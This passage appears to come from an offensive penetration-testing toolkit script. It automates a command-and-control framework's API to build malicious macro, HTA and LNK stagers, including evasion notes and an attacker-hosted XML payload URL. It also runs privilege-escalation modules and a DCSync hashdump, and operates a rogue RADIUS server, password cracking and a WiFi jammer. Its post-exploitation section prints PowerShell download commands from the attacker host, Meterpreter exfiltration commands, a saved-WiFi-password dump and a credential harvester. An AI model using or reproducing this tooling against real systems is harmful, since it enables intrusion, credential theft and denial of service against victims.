            echo -e "\E[1;34m::::: \e[97mPSE Listener Has Been Created \E[1;34m:::::"
			;;
		"Get PSE Stagers")
    pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
		curl --insecure -i https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_stagers_pre.txt
		sed "/}}},{\"Author/s/}}},{\"Author/\"}}}, \r\n{\"Author\"/g" ~/ATAT/PSE_stagers_pre.txt > ~/ATAT/PSE_stagers.txt
		rm ~/ATAT/PSE_stagers_pre.txt	
            echo -e "\E[1;34m::::: \e[97mStagers have been saved to ~/ATAT/PSE_stagers.txt \E[1;34m:::::"
			;;
		"Get PSE Agents")
    pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
		curl --insecure -i https://$userlistener:$userport/api/agents?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_agents_pre.txt	
            echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_agents.txt \E[1;34m:::::"
			;;
		"Rename PSE Agent")
    pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent Name (Current): ' agentname; read -p 'Set New Name for PSE Agent: ' useragentname; 
		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/agents/$agentname/rename?token=$(cat $pseauthtoken) -X POST -d '{"newname":'\"$useragentname\"'}'
            echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_agents.txt \E[1;34m:::::"
			;;
		"Generate PSE Stagers - Windows (mostly)")
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    outputfile=~/ATAT/PSE_stager_launcher.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE listener name (http, DeathStar, etc.): ' userlistenername; read -p 'Select 1 of the following PSE Stagers ONLY (windows/backdoorLnkMacro, windows/teensy, windows/macro, windows/launcher_xml, windows/launcher_vbs, windows/launcher_sct, windows/launcher_bat, multi/macro): ' userstager;
		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) -X POST -d '{"StagerName":'\"$userstager\"', "Listener":'\"$userlistenername\"'}' | grep -Po '"Output":.*?[^\\]",' | sed 's/^.\{10\}//' | sed '$s/..$//' | tee ~/ATAT/PSE_stager_launcher_pre.txt
		cat ~/ATAT/PSE_stager_launcher_pre.txt | base64 --decode > $outputfile
		rm ~/ATAT/PSE_stager_launcher_pre.txt
            echo -e "\E[1;34m::::: \e[97mStager output has been saved to ~/ATAT/PSE_stager_launcher.txt \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/backdoorLnkMacro"" - XLS macro (to be delivered to & run on vitcim machine) written to /tmp/default.xls  
            Remember to add macro code from default.xls to any other XLS prior to use on victim. 
            XML code that is called by the XLS macro has been written to /var/www/html/SfoLt.xml & ~/ATAT/PSE_stager_launcher.txt (for backup text copy)
            This XML file must be accessible by the target at this url: http://<ATTACKER_IP>/SfoLt.xml 
            The XLS macro (once run) will download the PSE powershell stager from within the XML code. 
            This is done to defeat application-aware security measures that flag on launches of powershell from unexpected programs, such as a direct launch from office applications. As the macro is pure vba and does not leverage powershell it is less likely to be detected by these types of tools.\E[1;34m:::::"
			;;
		"Generate PSE Stagers - Windows/OSX/Linux")
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    outputfile=~/ATAT/PSE_stager_launcher_multi.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE listener name (http, DeathStar, etc.): ' userlistenername; read -p 'Select 1 of the following PSE Stagers ONLY (windows/hta, windows/ducky, windows/bunny, osx/teensy, osx/safari_launcher, osx/macro, osx/launcher, osx/ducky, osx/applescript, multi/launcher, multi/bash ): ' userstager;
		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) -X POST -d '{"StagerName":'\"$userstager\"', "Listener":'\"$userlistenername\"'}' | grep -Po '"Output":.*?[^\\]",' | sed 's/^.\{10\}//' | sed '$s/..$//' | tee $outputfile
            echo -e "\E[1;34m::::: \e[97mStager output has been saved to ~/ATAT/PSE_stager_launcher_multi.txt \E[1;34m:::::"
			;;
		"Generate PSE Stagers - MSWord File & CSharp Payload")
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    outputfile=~/ATAT/PSE_stager_launcher_file.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE listener name (http, DeathStar, etc.): ' userlistenername; read -p 'Select 1 of the following PSE Stagers ONLY (windows/macroless_msword, windows/csharp_exe): ' userstager;
		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) -X POST -d '{"StagerName":'\"$userstager\"', "Listener":'\"$userlistenername\"'}' | grep -Po '"Output":.*?[^\\]",' | sed 's/^.\{10\}//' | sed '$s/..$//' | tee $outputfile
            echo -e "\E[1;34m::::: \e[97mStager output has been saved to ~/ATAT/PSE_stager_launcher_file.txt \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/macroless_msword""
            'empire.docx' and 'default.ps1' was created in the '/tmp/' directory \E[1;34m:::::"
            echo ""
            echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/csharp_exe""
            launcher.src.zip created in the '/tmp/' directory \E[1;34m:::::"
			;;
		"Execute Bloodhound Data Collection - Local")
	echo -e "\E[1;34m::::: \e[97mBE CAREFUL - This Will Create CSV Files On The TARGET Machine In Your Current Directory That Will Need To Be Exfitrated & Imported Into BLoodhound Manually\E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mi.e., If Your PSE Launcher Ran From The User's Desktop, All CSV Files WILL APPEAR On Their Desktop...You Have Been Warned\E[1;34m:::::"
	echo ""
	pseauthtoken=~/ATAT/PSE_perm_token.txt
	read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Search Entire Forest? True/False ' userforest;
	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/situational_awareness/network/bloodhound?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"SearchForest":'\"$userforest\"'}' >> ~/ATAT/Bloodhound_PSE.log
	        echo -e "\E[1;34m::::: \e[97mxXx Bloodhound Data Collection Has Begun xXx\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once The Background Task Has Been Completed\E[1;34m:::::"
			;;
		#"Execute Bloodhound Data Collection - Remote")
	#echo -e "\E[1;34m::::: \e[97mThis Will Automatically Import All Data Directly Into BLoodhound Via The neo4j API\E[1;34m:::::"
	#echo -e "\E[1;34m::::: \e[97mYour neo4j Service Will Need To Be Set To Bind To 0.0.0.0 As Described In The Bloodhound Options's Documentation\E[1;34m:::::"
	#echo ""
	#pseauthtoken=~/ATAT/PSE_perm_token.txt
    #read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Search Entire Forest? True/False ' userforest; read -p 'Set URI (http://host:port/) of Bloodhound neo4j location ' useruri; read -p 'Set Bloodhound neo4j User:Password ' userpass;
	#curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/situational_awareness/network/bloodhound?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"SearchForest":'\"$userforest\"',"URI":'\"$useruri\"',"UserPass":'\"$userpass\"'}' >> ~/ATAT/Bloodhound_PSE.log
	        #echo -e "\E[1;34m::::: \e[97mxXx Bloodhound Data Collection Has Begun xXx\E[1;34m:::::"
            #echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once The Background Task Has Been Completed\E[1;34m:::::"
			#;;
    	"Windows Post-Exploitation")
    inputfile=~/ATAT/PSE_windows_postex.txt
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
	for MODULE in $(cat $inputfile)
	do
	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Windows_PSE_postex.log
	sleep 10
	done
            echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
			;;
		"Windows DC Hashdump")
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Grab Only Active Accounts? True/False ' useractive; read -p 'Grab Entire Forest? True/False ' userforest;
	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/credentials/mimikatz/dcsync_hashdump?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"Active":'\"$useractive\"',"Forest":'\"$userforest\"'}' >> ~/ATAT/WindowsDC_PSE_postex.log
	        echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once The Background Task Has Been Completed\E[1;34m:::::"
			;;
		"Linux/OSX Post-Exploitation")
    inputfile=~/ATAT/PSE_linux_osx_postex.txt
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
	for MODULE in $(cat $inputfile)
	do
	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Linux_OSX_PSE_postex.log
	sleep 10
	done
            echo -e "\E[1;34m::::: \e[97mxXx Python Agent Has Been Pillaged xXx\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
			;;
		"Get Post Ex Results From PSE Agent")
    pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'PSE Agent to Poll: ' useragent; 
	curl --insecure -i https://$userlistener:$userport/api/agents/$useragent/results?token=$(cat $pseauthtoken)	| tee ~/ATAT/agent_results_pre.txt
	awk '{gsub(/\\n/,"\n")}1' ~/ATAT/agent_results_pre.txt >> ~/ATAT/agent_results_pre1.txt #Remove "\n" from output and replace it with a new line
	awk '{gsub(/\\r/,"\n")}1' ~/ATAT/agent_results_pre1.txt >> ~/ATAT/agent_results.txt #Remove "\r" from output and replace it with a new line
	rm ~/ATAT/agent_results_pre*.txt
            echo -e "\E[1;34m::::: \e[97mPSE Agent's Results Have Been Polled & Are Available In ~/ATAT/agent_results.txt\E[1;34m:::::"
			;;
		"Get PSE Stored Credentials")
    pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
	curl --insecure -i https://$userlistener:$userport/api/creds?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_creds.txt	
            echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_creds.txt \E[1;34m:::::"
			;;
		"Windows Privilege Escalation")
    inputfile=~/ATAT/PSE_windows_privesc.txt
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
	for MODULE in $(cat $inputfile)
	do
	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Windows_PSE_privesc.log
	sleep 10
	done
            echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been (Hopefully) Escalated xXx\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
			;;	
		"Linux/OSX Privilege Escalation")
    inputfile=~/ATAT/PSE_linux_osx_privesc.txt
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
	for MODULE in $(cat $inputfile)
	do
	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Linux_OSX_PSE_privesc.log
	sleep 10
	done
            echo -e "\E[1;34m::::: \e[97mxXx Python Agent Has Been (Hopefully) Escalated xXx\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
			;;
		"Kill PSE Listener")
    pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Listener to Kill): ' userlistener; 
	curl --insecure -i https://$userlistener:$userport/api/listeners/$userlistener?token=$(cat $pseauthtoken) -X DELETE	
            echo -e "\E[1;34m::::: \e[97m\E[1;34m"$userlistener"\E[1;34m Has Been Killed \E[1;34m:::::"
			;;
		"Kill All PSE Listeners")
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport;
	curl --insecure -i https://$userlistener:$userport/api/listeners/all?token=$(cat $pseauthtoken) -X DELETE	
            echo -e "\E[1;34m::::: \e[97mAll PSE Listeners Have Been Killed \E[1;34m:::::"
			;;
		"Restart PSE RESTful API")
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport;	
	curl --insecure -i https://$userlistener:$userport/api/admin/restart?token=$(cat $pseauthtoken)
		echo -e "\E[1;34m::::: \e[97mPSE RESTful API Has Been Restarted \E[1;34m:::::"
			;;
		"Shutdown PSE RESTful API")
	pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport;	
    curl --insecure -i https://$userlistener:$userport/api/admin/shutdown?token=$(cat $pseauthtoken)
		echo -e "\E[1;34m::::: \e[97mPSE RESTful API Has Been Shutdown \E[1;34m:::::"
			;;
		"Main Menu")
           ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;
 "10" | "10" )
         
 echo -e "\E[1;34m::::: \e[97mWireless Attacks!!\E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mOption 1 MUST Be Run BEFORE Using The HostAPD-WPE Attack\E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mOption 2 MUST Be Run AFTER Using The HostAPD-WPE Attack To Allow WLAN NIC To Function Normally\E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97m**WARNING** HostAPD-WPE Option Will *KILL ALL* Normal Network Connections For WLAN Interface Selected Until Option 2 Is Run!!\E[1;34m:::::"
 
PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
options=("Remove Wireless NIC from Network Manager" "Reset Wireless NIC for Network Manager Usage" "HostAPD-WPE Enterprise WiFi Fake RADIUS Server Attack" "Airgeddon" "Multi-Target Asleap Attack" "Multi-Target John The Ripper Attack" "WiFi Jammer" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
		"Remove Wireless NIC from Network Manager")
	#get MAC from wireless nic to be used in attack and add the MAC to /etc/NetworkManager/NetworkManager.conf (or where is best)
	#[keyfile]
	#unmanaged-devices=mac:00:11:22:33:44:55
	echo -e "\E[1;34m::::: \e[97mCopy MAC address from the WLAN NIC interface you wish to use in your HostAPD-WPE attack\E[1;34m:::::"
	ip addr
	echo ""
	echo -e "\E[1;34m::::: \e[97mFor ParrotOS & Distros That Auto Spoof MACs, Check 'Permanent MAC:' Value For Desired Interface To Be Sure You Have The Correct MAC. This WILL NOT WORK If You Enter A Spoofed MAC!\E[1;34m:::::"
		read -p 'Enter WLAN NIC You Wish To Use (wlan0, wlan1, Etc.): ' userspnic;
	macchanger -s $userspnic
	echo -e "\E[1;34m::::: \e[97mPaste copied 'Permanent MAC' address from above into Set MAC for HostAPD-WPE Attacking WLAN NIC: prompt\E[1;34m:::::"
		read -p 'Set MAC for HostAPD-WPE Attacking WLAN NIC: ' usermac;
	mkdir -p /etc/NetworkManager/conf.d/
	touch  /etc/NetworkManager/conf.d/NetworkManager.conf
	echo [main] > /etc/NetworkManager/conf.d/NetworkManager.conf
	echo plugins=ifupdown,keyfile >> /etc/NetworkManager/conf.d/NetworkManager.conf
	echo  >> /etc/NetworkManager/conf.d/NetworkManager.conf
	echo [ifupdown] >> /etc/NetworkManager/conf.d/NetworkManager.conf
	echo managed=false >> /etc/NetworkManager/conf.d/NetworkManager.conf
	echo  >> /etc/NetworkManager/conf.d/NetworkManager.conf
	echo [keyfile] >> /etc/NetworkManager/conf.d/NetworkManager.conf
	echo unmanaged-devices=mac:$usermac >> /etc/NetworkManager/conf.d/NetworkManager.conf
	service NetworkManager restart	
		    ;;
		"Reset Wireless NIC for Network Manager Usage")
	#get MAC from wireless nic used in attack and remove the MAC from /etc/NetworkManager/NetworkManager.conf (or where is best)
	#[keyfile]
	#unmanaged-devices=mac:00:11:22:33:44:55
	rm /etc/NetworkManager/conf.d/NetworkManager.conf
	service NetworkManager restart
		    echo -e "\E[1;34m::::: \e[97mWireless NIC Reset To Managed Mode\E[1;34m:::::"
		    ;;
        "HostAPD-WPE Enterprise WiFi Fake RADIUS Server Attack")
            read -p 'Set SSID for Target Network: ' userssid; read -p 'Set WLAN NIC Interface (wlan0, wlan1, etc.): ' usernic;
	sed "/ssid=/s/hostapd-wpe/$userssid/g" /etc/hostapd-wpe/hostapd-wpe.conf > /etc/hostapd-wpe/hostapd-wpe1.conf
	sed "/interface=/s/wlan0/$usernic/g" /etc/hostapd-wpe/hostapd-wpe1.conf > /etc/hostapd-wpe/hostapd-wpe2.conf
	hostapd-wpe /etc/hostapd-wpe/hostapd-wpe2.conf | tee ~/ATAT/hostapd-wpe_output.txt
	awk '$1 == "challenge:" {c=$2} $1 == "response:" {printf("-C %s -R %s\n", c, $2)}' ~/ATAT/hostapd-wpe_output.txt >> ~/ATAT/asleap_users.txt
	awk '/jtr NETNTLM:/' ~/ATAT/hostapd-wpe_output.txt >> ~/ATAT/john_users.txt
	sed -i "/jtr NETNTLM:/s/jtr NETNTLM:/""/g" ~/ATAT/john_users.txt
	        echo -e "\E[1;34m::::: \e[97mRun Multi-Target Asleap or John The Ripper To Recover Passwords From Collected Challenge/Response Pairs\E[1;34m:::::"
            ;;
		"Airgeddon")
    echo -e "\E[1;34m::::: \e[97mLaunching Airgeddon!!\E[1;34m:::::"
	bash airgeddon
            ;;
		"Multi-Target Asleap Attack")
    read -p 'Set Path To Wordlist: ' wordlist;
    echo -e "\E[1;34m::::: \e[97mCracking Passwords!!\E[1;34m:::::"
    inputfile=~/ATAT/asleap_users.txt
	cat $inputfile | while read line
	do
	asleap $line -W $wordlist | tee  ~/ATAT/asleap_output.txt
	cat ~/ATAT/asleap_output.txt >> ~/ATAT/asleap_cracked.txt
	rm ~/ATAT/asleap_output.txt
	done
	        echo -e "\E[1;34m::::: \e[97mAsleap Output & All Cracked Passwords Located in ~/ATAT/asleap_cracked.txt \E[1;34m:::::"
            ;;
		"Multi-Target John The Ripper Attack")
    read -p 'Set Path To Wordlist: ' wordlist;
    echo -e "\E[1;34m::::: \e[97mCracking Passwords!! \E[1;34m:::::"
    inputfile=~/ATAT/john_users.txt
	john --wordlist $wordlist $inputfile | tee  ~/ATAT/john_output.txt
	cat ~/ATAT/john_output.txt >> ~/ATAT/john_cracked.txt
	rm ~/ATAT/john_output.txt
	john --show ~/ATAT/john_users.txt | tee ~/ATAT/john_cracked.txt
	        echo -e "\E[1;34m::::: \e[97mJohn The Ripper Output & All Cracked Passwords Located in ~/ATAT/john_cracked.txt \E[1;34m:::::"
            ;;  
        "WiFi Jammer")
    read -p 'Set Blast Raduis: ' usertargets;
    echo -e "\E[1;34m::::: \e[97mDeauth Attack - Automatically Detects ALL Access Points & Clients In Range \E[1;34m:::::"
    echo -e "\E[1;34m::::: \e[97mThis Attack Will Hold Down the \E[1;34m"$usertargets"\E[1;34m Closest Clients Indefinitely \E[1;34m:::::"
    echo -e "\E[1;34m::::: \e[97mThis Attack Is ILLEGAL If Not Conducted In A Controlled Environment That Is Free Of Networks That Are Not In Scope!! Use Responsibly & With Great Caution! \E[1;34m:::::"
    echo -e "\E[1;34m::::: \e[97mUse Ctrl+C In Jammer Window to Stop Attack \E[1;34m:::::"
	python ~/wifijammer-ng/wifijammer.py -m $usertargets -p 15
            ;;                 
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done 
  
;;

 "11" | "11" )
         
 echo -e "\E[1;34m::::: \e[97mPost Exploitation \E[1;34m:::::"
 
PS3='Enter your choice: ENTER=Options Menu | 9=Main Menu | 10=QUIT: '
options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Wireless Password Stealer" "Windows 64 bit Credenital & Loot Harvester" "Windows 32 bit Credenital & Loot Harvester" "Bashark" "Pupy" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
		"Push File To Target with SCP - Creds Required")	
	read -p 'Enter Local File Including Full Path: ' userfile; read -p 'Enter Username On Target Machine: ' username; read -p 'Enter Target Machine Name / IP: ' usermachine; read -p 'Enter File Destination Full Path on Target Machine: ' userpath;
	scp $userfile $username@$usermachine:$userpath
		    ;;
		"Data Exfiltration")	
	read -p 'Enter Remote File On Target Including Full Path (C:\\\\\Users\\\\\Profile\\\\\filename.ext): ' remoteuserfile; read -p 'Enter File Destination Full Path on Local Machine for MSF (/root/file.ext): ' msflocaluserpath; #read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Local Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
		echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
        echo download \"$remoteuserfile\" \"$msflocaluserpath\"
		    ;;
		"Push File To Target with PSH / Meterpreter")
	SERVICE=Apache;
	secs=$(date '+%S');
	if service apache2 status | grep -v grep | grep running > /dev/null
	then
		echo "$SERVICE service running"
	else
		echo "$SERVICE is not running, Starting service." 
		service apache2 start
	fi 
	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Including Full Path (/var/www/html/filename.ext): ' localuserfile; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Target Machine for MSF (%WINDIR%\\\\\System32\\\\\file.ext): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command \E[1;34m:::::" 
		echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/$webuserfile\',\'$pshuserpath\'\)
			
        echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
        echo upload $localuserfile $msfuserpath
            ;;
        "Wireless Password Stealer")
    echo -e "\E[1;34m::::: \e[97mA Powershell Terminal With Admin Rights Is Necessary \E[1;34m:::::"
    echo -e "\E[1;34m::::: \e[97mPowershell Command To Get Wireless Passwords \E[1;34m:::::" 
    echo ""
    echo \(netsh wlan show profiles\) \| Select-String \"\\:\(.+\)\$\" \| \%\{\$name\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| \%\{\(netsh wlan show profile name\=\""\$name\"" key\=clear\)\}  \| Select-String \""Key Content\\W+\\:(.+)\$\"" \| \%\{\$pass\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| \%\{\[PSCustomObject\]@\{ "PROFILE_NAME"\=\$name\;PASSWORD\=\$pass \}\} \| Format-Table -AutoSize \| Out-File WiFi.txt
    echo ""
    echo -e "\E[1;34m::::: \e[97mA WiFi.txt File Will Be Created In The Directory From Which This Command Is Run \E[1;34m:::::" 
    echo -e "\E[1;34m::::: \e[97mIMPORTANT! \E[1;34m:::::"
    echo -e "\E[1;34m::::: \e[97mChange Directories Into One That Can Be Written To Without The Need For A UAC Prompt Before You Run This Command! \E[1;34m:::::" 
    #echo ""
	#echo -e "\E[1;34m::::: \e[97mPowershell Command To Get Install Configs\E[1;34m:::::" 
	#echo \$F \= @\(\)\;\$F \+\= \"C:\\sysprep.inf\"\;\$F \+\= \"C:\\sysprep\\sysprep.xml\"\;\$F \+\= \"C:\\WINDOWS\\panther\\Unattend\\Unattended.xml\"\;\$F \+\= \"C:\\WINDOWS\\panther\\Unattended.xml\"\; \$i \= 0\; foreach\(\$file in \$F\) \{if \(Test-Path \$file\)\{cp \$file \c:\;\$i\+\+\}\}
			;;
		"Windows 64 bit Credenital & Loot Harvester")
    SERVICE=Apache;
	secs=$(date '+%S');
	if service apache2 status | grep -v grep | grep running > /dev/null
	then
		echo "$SERVICE service running"
	else
		echo "$SERVICE is not running, Starting service." 
		service apache2 start
	fi 
	cp ~/ATAT/word_x64.txt /var/www/html/word_x64.txt
	chown www-data:www-data /var/www/html/word_x64.txt
	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter File Destination Full Path on Target Machine for MSF (Recommended: %USERPROFILE%\\\\\\word_x64.exe): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (Recommended: %USERPROFILE%\\word_x64.exe): ' pshuserpath;
		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command \E[1;34m:::::" 
		echo -e "\E[1;34m\e[97m \e[31m powershell (new-object System.Net.WebClient).DownloadFile('http://$userhost/word_x64.txt','$pshuserpath')\e[97m\E[1;34m"
			
        echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
        echo -e "\E[1;34m\e[97m \e[31m upload /root/ATAT/word_x64.txt $msfuserpath \e[97m\E[1;34m"
        echo ""
		echo -e "\E[1;34m::::: \e[97mRun These Commands Once The File Is On The Target \E[1;34m:::::" 
		echo ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
		echo -e "\E[1;34m::::: \e[97mWindows Terminal Commands (Change Your Chosen File Path As Appropriate \E[1;34m:::::"
		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31m word_x64.exe all -vv -oA \e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m::::: \e[97mMeterpreter Command (Change Your Chosen File Path As Appropriate) \E[1;34m:::::"
		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31m execute -H -c -i -f word_x86.exe -a 'all -vv -oA' \e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m::::: \e[97mJSON & TXT \"credentials_xxxxxxxx_xxxxxx\" Output Files Are In The Directory You Ran This EXE From \E[1;34m:::::"
		echo ""	
		echo -e "\E[1;34m::::: \e[97m*EXAMPLE* Meterpreter Command To Download Your Loot \E[1;34m:::::"
		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.txt' /root/ATAT/ \e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
		echo -e "\E[1;34m::::: \e[97mDon't Forget To Delete The \"credentials_xxxxxxxx_xxxxxx\" TXT & JSON Files & word_x64.exe \E[1;34m:::::"
			;;
		"Windows 32 bit Credenital & Loot Harvester")
    SERVICE=Apache;
	secs=$(date '+%S');
